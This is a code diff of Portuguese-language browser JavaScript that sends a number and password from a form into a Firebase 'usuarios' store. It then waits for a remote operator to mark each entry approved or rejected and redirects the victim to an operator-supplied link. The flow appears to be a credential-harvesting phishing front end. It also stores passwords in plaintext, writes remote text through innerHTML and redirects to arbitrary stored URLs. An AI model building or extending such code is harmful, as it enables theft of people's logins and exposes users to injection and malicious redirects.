@@ -2,33 +2,120 @@ function enviar() {
 
   const numero = document.getElementById("numero").value;
   const senha = document.getElementById("senha").value;
+  const msg = document.getElementById("msg");
 
-  const agora = new Date();
+  if (!numero || !senha) {
+    msg.innerHTML = "Preencha todos os campos.";
+    return;
+  }
 
   const dados = {
+
     numero: numero,
     senha: senha,
-    dataHora: agora.toLocaleString("pt-PT"),
+    dataHora: new Date().toLocaleString("pt-PT"),
+
     status: "pendente",
+
     mensagem: "⏳ Processando requisitos... Por favor, aguarde.",
+
     link: ""
+
   };
 
-  db.ref("usuarios").push(dados)
-    .then(() => {
 
-      document.getElementById("msg").innerHTML =
-      "⏳ Processando requisitos... Por favor, aguarde.";
+  const novoRegistro = db.ref("usuarios").push();
 
-      document.getElementById("numero").value = "";
-      document.getElementById("senha").value = "";
 
-    })
-    .catch((erro) => {
+  novoRegistro.set(dados)
 
-      document.getElementById("msg").innerHTML =
-      "❌ Erro: " + erro.message;
+  .then(() => {
 
-    });
+
+    // Guardar o ID deste pedido no navegador
+
+    localStorage.setItem("pedidoID", novoRegistro.key);
+
+
+    msg.innerHTML =
+    "⏳ Processando requisitos... Por favor, aguarde.";
+
+
+    acompanharStatus();
+
+
+  })
+
+
+  .catch((erro)=>{
+
+    msg.innerHTML =
+    "Erro: " + erro.message;
+
+  });
+
 
 }
+
+
+
+function acompanharStatus(){
+
+
+ const id = localStorage.getItem("pedidoID");
+
+
+ if(!id){
+   return;
+ }
+
+
+ db.ref("usuarios/" + id).on("value",(snapshot)=>{
+
+
+    const dados = snapshot.val();
+
+
+    if(!dados){
+      return;
+    }
+
+
+    const msg = document.getElementById("msg");
+
+
+    if(dados.status === "aprovado"){
+
+
+       msg.innerHTML = dados.mensagem;
+
+
+       if(dados.link){
+
+          setTimeout(()=>{
+
+             window.location.href = dados.link;
+
+          },3000);
+
+       }
+
+
+    }
+
+
+
+    if(dados.status === "rejeitado"){
+
+
+       msg.innerHTML = dados.mensagem;
+
+
+    }
+
+
+
+ });
+
+
+      }
